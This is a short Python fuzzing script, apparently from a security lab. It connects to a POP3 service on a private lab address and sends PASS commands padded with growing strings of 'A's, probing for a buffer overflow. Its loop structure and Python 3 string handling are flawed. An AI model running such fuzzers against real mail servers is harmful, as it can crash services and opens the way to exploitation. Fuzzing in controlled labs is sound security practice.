#!/usr/bin/python3 

"""	
fuzzer script to attack net authetication service:

change privileges of script:
	chmod +x net_fuzzer.py
execute script code: 
	./net_fuzzer.py 
"""

import socket
# Create an array of buffers, from 1 to 5900, with increments of 200.
buffer=["A"]
counter=100
while len (buffer) <= 30:
    buffer.append("A"*counter) 
    counter=counter+200
    for string in buffer:
        print ("Fuzzing PASS with %s bytes" % len(string)) 
        s=socket.socket (socket.AF_INET, socket.SOCK_STREAM) 
        connect=s.connect(('10.0.2.15',110))
        s.recv(1024)
        s.send('USER test\r\n')
        s.recv (1024)
        s.send('PASS'+ string + '\r\n')
        s.send('QUIT\r\n')
        s.close()